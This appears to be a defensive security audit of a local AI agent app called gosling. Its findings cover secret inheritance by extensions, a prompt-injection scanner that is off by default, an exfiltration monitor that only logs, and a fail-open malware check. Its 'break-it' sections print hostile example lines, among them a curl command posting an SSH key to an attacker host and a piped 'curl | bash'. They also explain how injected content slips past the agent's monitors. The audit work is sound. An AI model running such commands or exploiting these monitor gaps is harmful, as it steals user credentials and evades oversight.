# Audit Report — Classic Application Security Lens (gosling)

- **Lens:** `10_audit/audit-security` (classic appsec: authn/authz, IDOR/object-scope,
  trust boundaries, secrets, injection, deployment posture, sensitive route exposure,
  unsafe external execution). LLM-specific prompt-injection / excessive-agency is a
  separate lens (`audit-security-llm`); cross-references are marked.
- **Scope:** `crates/gosling-server`, `crates/gosling/src/oauth`,
  `crates/gosling/src/security`, `crates/gosling/src/agents`
  (`extension_manager`, `extension_malware_check`, shell exec, `mcp_client`),
  `crates/gosling/src/config`, `crates/gosling-cli` serve path.
- **Authority:** AUDIT-ONLY / READ-ONLY. No source modified. Only this report written.
- **Effort budget:** ~35 read/grep tool calls against orientation §5 surfaces 1–4
  (permission/security controls, secret handling, MCP/subprocess spawning). Sampled;
  unreviewed areas listed in Validation Limits. Method: `audit_method.md v3.0` +
  `evidence_discipline.md`. The supplied prompt was treated as a draft; mission preserved,
  review expanded to the two server entrypoints and the env-inheritance seam.

## Trust model (single load-bearing fact)

Both server entrypoints (`goslingd agent`, `gosling serve`) authenticate with **one
global bearer secret** (`X-Secret-Key` header or `?token=` query). There is no
per-object or per-action authorization, because this is a **single-user local agent**,
not a multi-tenant service. Consequently classic **IDOR / object-scope (SEC-003)** does
not apply — `/diagnostics/{session_id}` and session routes are scoped only by the shared
secret, which is correct for this architecture (recorded as a non-finding). The flip side:
**possession of the secret = full local RCE** (the authenticated `/config` route can
register a `Stdio` extension with an arbitrary `cmd`, and the `shell` tool runs `sh -c`),
so **secret handling and the auth boundary are the whole game.**

## Boundary map (surfaces reviewed)

| Surface | Actor | Authority | Reached object | Boundary | Enforcement | Bypass path |
|---|---|---|---|---|---|---|
| REST routes (`/config`, `/agent`, `/reply`, `/session`, `/system_info`, `/diagnostics`) | any local client | server secret | agent, config, sessions | bearer token | `check_token` middleware (auth.rs) | exempt paths; secret leak |
| `/status`, `/mcp-app-proxy`, `/mcp-app-guest` | any origin | none / query secret | health, proxy HTML store | none / `?secret=` | auth-exempt in middleware (auth.rs:15-19) | CORS `Any` + DNS-rebind on goslingd |
| ACP WebSocket | desktop/CLI client | server secret | agent loop | token (header or `?token=`) | `check_acp_token` | query-string secret exposure |
| Shell tool | LLM (untrusted) | user perms | local OS | permission gate | permission lens (not here) | agency — LLM lens |
| MCP stdio extension | third-party code | inherits goslingd env | OS + secrets | env scrubbing + malware check | **none / OSV (narrow, fail-open)** | env inheritance; non-npx/uvx cmd |
| Secret store | user | fs perms | API keys, OAuth tokens | keyring / 0o600 file | keyring + `write_secrets_file` | env-inherited by children |

## Findings summary

| ID | Severity | Confidence | Title |
|---|---|---|---|
| SEC-GSL-001 | High | Confirmed | MCP stdio extensions inherit goslingd's full environment (no scrubbing) — leaks provider keys & server secret to third-party code |
| SEC-GSL-002 | Medium | Confirmed | Prompt-injection SecurityInspector is disabled by default |
| SEC-GSL-003 | Medium | Confirmed | EgressInspector only logs, never blocks — exfil "control" is observational |
| SEC-GSL-004 | Medium | Confirmed | OSV malware check is narrow (npx/uvx only) and fail-open on any error |
| SEC-GSL-005 | Low | Confirmed | goslingd bridge uses wildcard CORS + auth-exempt routes (weaker than sibling `serve` path) |
| SEC-GSL-006 | Low | Confirmed | ACP secret transmitted as URL query parameter |

---

## SEC-GSL-001: MCP stdio extensions inherit the full parent environment

Severity: High
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling/src/agents/extension_manager.rs:1103-1107` — non-container stdio launch:
  `let cmd = resolve_command(cmd); Command::new(cmd).configure(|command| { command.args(args).envs(all_envs); })` — no `.env_clear()`.
- `crates/gosling/src/agents/extension_manager.rs:374-387` (`child_process_client`) — only `PATH` and `current_dir` are overridden before spawn; no env scrubbing.
- `crates/gosling/src/agents/extension_manager.rs:515-566` (`merge_environments`) — `all_envs` carries only explicitly-declared `env_keys`; the rest of the child env is whatever the parent holds.
- Contrast: the Docker path (`extension_manager.rs:1093-1101`) passes only explicit `-e KEY=VALUE`, so the container variant does *not* leak the host env — evidence that scrubbing is feasible and was applied there but not to the local path.

Observed behavior:
- A locally-spawned MCP extension subprocess inherits goslingd's entire process environment. `tokio::process::Command` inherits the parent env by default, and `.envs(all_envs)` only augments it.

Expected boundary:
- Third-party extension code (orientation §4: "attacker-influenceable content; the framework spawns and trusts them") should receive a minimal, explicit environment — only the secrets the extension declares — not every secret in goslingd's env.

Failure mechanism:
- No `env_clear()` on the local spawn path. If the operator supplied provider credentials via environment variables (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, …) or set `GOSLING_SERVER__SECRET_KEY`, all of them are readable by the extension process (`printenv`).

Break-it angle:
- Configure any stdio MCP extension whose command reads `os.environ`. It sees every provider key and the server bearer secret. A compromised/malicious npm/PyPI MCP package (the exact threat the adjacent OSV check targets) exfiltrates them on first launch. `GOSLING_SERVER__SECRET_KEY` leakage is RCE-equivalent (see trust model).

Impact:
- Secret exposure of provider API keys and, when set in env, the server secret to third-party code. Blast radius escalates from "one extension" to "all credentials in the process".

Operational impact:
- Blast radius: Cross-system (leaked cloud provider keys)
- Side-effect class: process / external API
- Reversibility: irreversible (credential disclosure — must rotate)
- Operator visibility: silent
- Rerun safety: unsafe (re-leaks every launch)

Adjacent failure modes:
- Same inheritance applies to `InlinePython` (`uvx`, extension_manager.rs:1133) and likely the ACP/CLI provider subprocesses (`providers/claude_code.rs`, `codex.rs`, `gemini_cli.rs`, `cursor_agent.rs` — not individually traced; see Validation Limits). Cross-ref SEC-GSL-004 (malware check is the only gate and is bypassable).

Recommended mitigation:
- Remediation pattern: least-privilege environment for spawned children.
- Minimal repair: `command.env_clear()` then set only `PATH`, `all_envs`, and an explicit allowlist (e.g. `HOME`, `LANG`, session id) before spawn in `child_process_client` / the stdio branch.
- Local guardrail: a helper `spawn_scrubbed(cmd, envs)` used by every child-spawn site.
- Behavior test: spawn a stub extension that echoes its env; assert `OPENAI_API_KEY` / `GOSLING_SERVER__SECRET_KEY` are absent and declared `env_keys` are present.

Implementation assessment:
- Complexity: local_guardrail
- Cost: S
- Cost drivers: modules (each spawn site), tests
- Nominal implementation agent: codex
- Rationale: mechanical, well-scoped change with a direct negative test; the Docker path already shows the intended shape.

Validation:
- Test asserts the spawned child env contains only the allowlist + declared keys, not inherited secrets.

Non-goals:
- Do not redesign the extension config schema; only scrub the spawn environment.

---

## SEC-GSL-002: Prompt-injection SecurityInspector is disabled by default

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling/src/security/mod.rs:46-55` — `is_prompt_injection_detection_enabled()` reads `SECURITY_PROMPT_ENABLED` and returns `.unwrap_or(false)`.
- `crates/gosling/src/security/mod.rs:82-88` — `analyze_tool_requests` short-circuits to `Ok(vec![])` when disabled, so no scanning occurs.
- `SECURITY.md` (orientation §6) states prompt-injection risk is acknowledged and mitigation is claimed; the code control backing that claim is off unless the operator opts in.

Observed behavior:
- Out of the box, the pattern/ML prompt-injection scanner does not run. The `SecurityInspector` reports `is_enabled() == false` and returns no findings.

Expected boundary:
- A control that documentation presents as a mitigation should either be on by default or the docs should state it is opt-in; a default-off "security" control is defense-in-appearance.

Failure mechanism:
- Config default is `false`; there is no ship-time enablement.

Break-it angle:
- On a default install, a tool call containing `curl … | bash` sourced from injected content is neither blocked nor surfaced by this inspector. The real backstop is the permission/tool-confirmation gate (permission lens), not this module.

Impact:
- The marketed prompt-injection defense provides no protection in the default configuration; operators may over-trust it. Primary enforcement falls entirely on the permission gate.

Operational impact:
- Blast radius: Workflow
- Side-effect class: none (detection gap)
- Reversibility: n/a
- Operator visibility: log-only (a disabled-counter debug line)
- Rerun safety: safe

Adjacent failure modes:
- Even when enabled, above-threshold findings only `RequireApproval` (security_inspector.rs:27-33), not block. Cross-ref SEC-GSL-003 and the LLM lens (indirect prompt injection).

Recommended mitigation:
- Governance decision: choose default-on with a documented off switch, or align `SECURITY.md` to state the scanner is opt-in and name the enabling config key.
- Behavior test: assert the documented default matches `is_prompt_injection_detection_enabled()` on a fresh config.

Implementation assessment:
- Complexity: governance_decision
- Cost: S
- Cost drivers: docs, one default flip, tests
- Nominal implementation agent: human-owner
- Rationale: default-on has latency/false-positive tradeoffs and is a product policy call, not a mechanical fix.

Validation:
- Test pins the default state and cross-checks the docs claim.

Non-goals:
- Do not tune detection thresholds here.

---

## SEC-GSL-003: EgressInspector only logs; it never blocks or prompts

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling/src/security/egress_inspector.rs:369-383` — for every detected destination the result is `action: InspectionAction::Allow` with `confidence: 0.0`; the only side effect is a `tracing::info!(security.action = "LOG", …)` at lines 355-367.

Observed behavior:
- The egress/data-exfiltration inspector detects outbound destinations (curl POST, scp, git push, npm publish, netcat, etc.) and emits a log line, but always returns `Allow`. It never requires approval and never blocks.

Expected boundary:
- A "data exfiltration" control listed among the app's safety controls (orientation §5.2) should be able to at least gate outbound-upload commands, or its status as detection-only should be explicit.

Failure mechanism:
- Hard-coded `Allow`; the inspector is observational by construction.

Break-it angle:
- An agent turn that runs `curl -X POST https://attacker.tld -d @~/.ssh/id_rsa` is logged as `data_exfiltration … LOG` and then allowed to proceed (subject only to the permission gate, which does not consume this signal).

Impact:
- No enforcement against outbound exfiltration from this layer. Value is post-hoc forensic logging only. Cross-ref LLM lens (side-channel exfiltration).

Operational impact:
- Blast radius: Cross-system (arbitrary outbound destination)
- Side-effect class: network
- Reversibility: irreversible (data already sent)
- Operator visibility: log-only
- Rerun safety: unsafe

Adjacent failure modes:
- Regex extraction is heuristic (base64/obfuscated URLs, IP-literal, DNS-tunnel evade it) — even the logging is incomplete. Cross-ref SEC-GSL-002.

Recommended mitigation:
- Workflow protocol: for outbound-upload directions, return `RequireApproval` for detected destinations not on an operator allowlist, instead of `Allow`.
- Behavior test: assert an upload-direction command yields `RequireApproval`, and an allowlisted domain yields `Allow`.

Implementation assessment:
- Complexity: workflow_protocol
- Cost: M
- Cost drivers: modules, tests, operator_ux (allowlist)
- Nominal implementation agent: claude
- Rationale: touches the inspection-action contract and UX for approvals; needs care to avoid blocking normal `git push`.

Validation:
- Negative test: exfil-direction command is gated; inbound `git clone` is not.

Non-goals:
- Do not attempt exhaustive obfuscation-proof detection in this slice.

---

## SEC-GSL-004: OSV malware check is narrow and fail-open

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling/src/agents/extension_malware_check.rs:48-56` — only `cmd` ending in `uvx` (PyPI) or `npx` (npm) is checked; every other command returns `Ok(())` ("skipping OSV check (fail open)").
- `crates/gosling/src/agents/extension_malware_check.rs:211-233` — network error, HTTP error, and JSON parse error each `return Ok(())` ("failing open").
- `crates/gosling/src/agents/extension_malware_check.rs:82-97` — only the *first* non-flag argument is parsed.
- `crates/gosling/src/agents/extension_malware_check.rs:235-265` — only advisories whose id starts with `MAL-` block; ordinary vuln IDs pass.
- Call site: `extension_manager.rs:1084` — this is the sole pre-launch package gate for stdio extensions.

Observed behavior:
- The only automated defense against a malicious extension package is an OSV `MAL-*` lookup limited to `npx`/`uvx` invocations, the first package token, and one that silently passes on any transport failure.

Expected boundary:
- A pre-launch "malicious package" gate positioned in front of arbitrary subprocess execution should cover the realistic launch vectors or clearly advertise its narrow scope.

Failure mechanism:
- Scope limited to two commands; fail-open on all error paths; single-token parsing; MAL-only filter.

Break-it angle:
- Launch the extension as `node ./evil.js`, `bash -c …`, `python evil.py`, a direct binary, or `npx pkg-a evil-pkg` (second token) — none is checked. Or induce a network error / OSV outage — the check passes. The gate provides assurance it cannot back.

Impact:
- False sense of supply-chain protection in front of arbitrary local code execution.

Operational impact:
- Blast radius: Local → Cross-system (depends on payload)
- Side-effect class: process
- Reversibility: irreversible
- Operator visibility: silent (debug log on skip)
- Rerun safety: unsafe

Adjacent failure modes:
- Chains with SEC-GSL-001: a package that clears (or bypasses) OSV still inherits all env secrets.

Recommended mitigation:
- Minimal repair: document the gate as best-effort and (policy permitting) treat OSV transport failure as a soft-warn surfaced to the operator rather than a silent pass for non-pinned packages.
- Local guardrail: broaden ecosystem inference and scan all package-looking tokens, not just the first.
- Behavior test: assert a non-npx/uvx command and an OSV-500 response both produce an operator-visible signal (not a silent Ok).

Implementation assessment:
- Complexity: external_service_semantics
- Cost: M
- Cost drivers: modules, tests, external API behavior
- Nominal implementation agent: claude
- Rationale: fail-open vs fail-closed for a third-party service is a semantics/policy tradeoff (availability vs safety) needing judgement.

Validation:
- Tests cover the skip and error paths asserting a warning surfaces.

Non-goals:
- Do not make OSV a hard blocker for offline use without an operator override.

---

## SEC-GSL-005: goslingd bridge uses wildcard CORS with auth-exempt routes

Severity: Low
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling-server/src/commands/agent.rs:56-59` — `CorsLayer::new().allow_origin(Any).allow_methods(Any).allow_headers(Any)`.
- `crates/gosling-server/src/auth.rs:15-19` — `/status`, `/mcp-app-proxy`, `/mcp-app-guest` bypass `check_token`.
- Contrast: `crates/gosling-cli/src/cli.rs:1139-1150` — the `serve` path forbids `*`/empty origins and defaults to loopback origins only, showing the intended stricter posture.

Observed behavior:
- On the goslingd (`gosling-server`) REST surface, any web origin is a permitted CORS origin, and three routes require no bearer token. Default host is loopback (`configuration.rs:74-76`), so exposure is via the user's browser / DNS-rebinding rather than the network.

Expected boundary:
- The two entrypoints should share a posture. The CLI `serve` path restricts origins; the goslingd bridge should not be wildcard while shipping auth-exempt routes.

Failure mechanism:
- `allow_origin(Any)` + `allow_headers(Any)` makes cross-origin responses readable; the exempt routes need no secret. A malicious page (or DNS-rebind to `127.0.0.1:3000`) can reach `/status` and issue `/mcp-app-guest` POSTs (which still validate `?secret=` in the body, so they hold) unauthenticated.

Break-it angle:
- A visited web page fetches `http://127.0.0.1:3000/status` cross-origin and reads `ok` (confirms goslingd is running / port). Authenticated routes still require the 32-byte secret, so impact is confined to fingerprinting and the exempt surface.

Impact:
- Low: local service fingerprinting and unauthenticated reach to the exempt routes; no secret disclosure. Weaker than the sibling entrypoint's boundary.

Operational impact:
- Blast radius: Local
- Side-effect class: user-visible (proxy HTML store) / none
- Reversibility: reversible
- Operator visibility: silent
- Rerun safety: safe

Adjacent failure modes:
- No `Host`/`Origin` allowlist means DNS-rebinding protection relies entirely on the secret for authed routes.

Recommended mitigation:
- Minimal repair: replace `allow_origin(Any)` with the same loopback/allowlist origins used by `serve`; keep the exempt list minimal.
- Behavior test: cross-origin request from a disallowed origin is rejected by CORS; `/status` still reachable same-origin.

Implementation assessment:
- Complexity: local_guardrail
- Cost: S
- Cost drivers: modules, tests
- Nominal implementation agent: codex
- Rationale: mirror an existing, proven configuration from the CLI path.

Validation:
- Test asserts CORS rejects a foreign origin on goslingd.

Non-goals:
- Do not remove the exempt routes the desktop app depends on; only tighten CORS.

---

## SEC-GSL-006: ACP secret transmitted as URL query parameter

Severity: Low
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Security

Evidence:
- `crates/gosling/src/acp/transport/auth.rs:23-31` — `check_acp_token` accepts the token from the `?token=` query string.
- Desktop client builds `ws://127.0.0.1:PORT/acp?token=<secret>` (`ui/desktop/src/goslingServe.test.ts:104,114` asserting `buildLocalServeUrls`).

Observed behavior:
- The bearer secret is placed in the WebSocket URL query string in addition to the `X-Secret-Key` header path.

Expected boundary:
- Bearer secrets should travel in headers, not URLs, since query strings land in access logs, proxy logs, browser history, and `Referer`.

Failure mechanism:
- WebSocket clients cannot set custom headers in the browser, so the query-param path exists; but it broadens where the secret can be captured.

Break-it angle:
- If any reverse proxy or request logger is ever placed in front (or the URL is copied/screenshared), the secret is exposed. Mitigated today because the server writes no HTTP access log by default and binds loopback.

Impact:
- Low: increased secret-exposure surface; no active leak found in-repo.

Operational impact:
- Blast radius: Local
- Side-effect class: none
- Reversibility: reversible (rotate secret)
- Operator visibility: silent
- Rerun safety: safe

Adjacent failure modes:
- Any future access-log or proxy insertion would capture the token. Cross-ref SEC-GSL-001 (secret also env-inheritable).

Recommended mitigation:
- Minimal repair: prefer the `Sec-WebSocket-Protocol` subprotocol token pattern or a short-lived ticket exchanged over the header path; keep the query fallback only where unavoidable.
- Behavior test: assert the header path is used when available and that no logging middleware records the query string.

Implementation assessment:
- Complexity: local_guardrail
- Cost: M
- Cost drivers: modules (client + server), tests
- Nominal implementation agent: claude
- Rationale: touches both Rust auth and the Electron client contract.

Validation:
- Test asserts the secret is not present in any request log line.

Non-goals:
- Do not break the existing desktop handshake without a compatibility path.

---

## Explicit non-findings (checked and held)

- **Token comparison is constant-time.** `crates/gosling/src/acp/transport/auth.rs:9-13` uses `subtle::ConstantTimeEq` (`ct_eq`). No timing-oracle finding. Only a length side-channel remains, and the secret is fixed 64-hex length — not material.
- **Secrets file is 0o600 on Unix.** `crates/gosling/src/config/base.rs:42-54` (`write_secrets_file`) opens with `.mode(0o600)`; a test pins it (`base.rs:2158-2159`). (Windows uses default ACLs — noted as a minor gap in Validation Limits, not a Unix finding.)
- **Config API masks secret reads.** `crates/gosling-server/src/routes/config_management.rs:308-312` returns `MaskedValue` for `is_secret` keys; plaintext secret values are not returned over `/config`. Config *writes* are behind `check_token`.
- **Default deployment posture is safe.** goslingd default host `127.0.0.1` (`configuration.rs:74-76`), TLS default `true` (`configuration.rs:82`); `gosling serve` default host `127.0.0.1` (`cli.rs:601-602`) and requires the secret or an explicit, well-named `--dangerously-unauthenticated` flag (`cli.rs:1129-1138`).
- **OAuth uses the loopback RFC-8252 flow with delegated CSRF.** `crates/gosling/src/oauth/mod.rs:135-178` binds `127.0.0.1` on a random port and passes the `state` (CSRF token) to `oauth_state.handle_callback(&auth_code, &csrf_token)` (rmcp validates it). No CSRF finding.
- **No plaintext secret-value logging found** in the sampled grep over `crates/gosling/src` + `crates/gosling-providers/src` (log lines reference secret *keys*/cache state, not values). Limited to grep coverage.
- **Session imports do not carry extension configs.** `crates/gosling/src/session/import_formats/{claude_code,codex,pi}.rs` import conversation history; no `ExtensionConfig`/`Stdio` construction found there, so imported/shared sessions do not auto-launch subprocesses. (Recipe/deeplink provenance not fully traced — see Validation Limits.)
- **Shell `sh -c` is intended agency, not a classic injection defect.** `crates/gosling/src/agents/platform_extensions/developer/shell.rs:635-662` passes the whole command to the shell by design; the boundary is the permission/confirmation gate (permission lens / LLM excessive-agency lens), not metacharacter escaping.

## Break-it review (attacks attempted from static evidence)

- Enumerate object IDs I don't own (IDOR): N/A — single-user, single-secret model; no per-object owner scoping exists to bypass.
- Call backend route with UI control removed: config mutation (incl. arbitrary `Stdio` extension `cmd`) is reachable directly via authenticated `/config`; this is by-design given the secret = RCE trust model (recorded in trust model, not a separate finding).
- Unauthenticated sensitive route + forged headers: `/status` reachable with no secret; `/mcp-app-*` still enforce `?secret=`. → SEC-GSL-005.
- Inject metacharacters into shell field: intended agency; permission gate owns it (non-finding here).
- Hostile environment into external tool: MCP child reads all inherited env → SEC-GSL-001.
- Trigger error and read body/logs for secrets: config errors log secret *keys* not values; malware-check errors fail open silently → SEC-GSL-004.

## Validation Limits (NOT reviewed / needs drill)

- **No dynamic execution.** Server not run; findings are source-evidenced/simulation-reasoned, not runtime-observed. No live CORS, DNS-rebind, or env-leak reproduction performed.
- **Permission/tool-confirmation gate** (`permission/permission_judge.rs`, `permission_inspector.rs`, `agents/tool_confirmation_router.rs`) — the real enforcement boundary — deferred to the permission/LLM lens; not audited here.
- **Recipe & deeplink provenance** — whether a recipe/deeplink can inject an `ExtensionConfig::Stdio { cmd }` from untrusted input (turning "config write needs auth" into "untrusted content → arbitrary `cmd`") was not traced. Flagged for the LLM/agency lens; **requires-authorized-drill**. This is the highest-value unreviewed seam adjacent to this lens.
- **Provider CLI/ACP subprocess spawns** (`providers/claude_code.rs`, `codex.rs`, `gemini_cli.rs`, `cursor_agent.rs`, `azureauth.rs`; `acp/provider.rs`; `hooks/mod.rs`; `plugins/mod.rs`; `posthog.rs`) not individually checked for the same env-inheritance issue as SEC-GSL-001 — likely share it.
- **`classification_client.rs` / `adversary_inspector.rs`** — whether the ML classifier ships user/tool content to a remote endpoint (a data-egress concern) was not read.
- **`mcp_app_proxy` guest-HTML store** — XSS/CSP correctness of stored-then-served HTML (build_outer_csp, `strict-origin`) not deeply reviewed; it is `secret`-gated so lower priority.
- **Windows secrets-file permissions** (`write_secrets_file` non-unix branch uses `std::fs::write`, default ACLs) not evaluated.
- **Provider auth files** (aws/gcp/azure/databricks/snowflake keyring usage) inventoried but not read.
- **Telemetry/OTel/posthog** egress of session metadata not reviewed.

## Skill Escalation (cross-lens)

| Observation | Target lens | Why |
|---|---|---|
| SecurityInspector default-off (SEC-GSL-002) + EgressInspector log-only (SEC-GSL-003) | `audit-security-llm` | These are the app's indirect-prompt-injection / exfil controls; their non-enforcement is central to the LLM trust path. |
| Recipe/deeplink → `ExtensionConfig::Stdio { cmd }` provenance (unreviewed) | `audit-security-llm` / permission lens | Potential untrusted-content-to-arbitrary-command path; confused-deputy escalation. |
| Env inheritance to provider subprocesses (SEC-GSL-001 adjacency) | `audit-security-nodejs` / dependency lens | Same scrubbing gap likely across provider CLI bridges. |
| Secret = RCE trust model (single bearer token, no per-action authz) | `audit-compliance-posture` | Judge against `SECURITY.md` claims of blast-radius containment. |
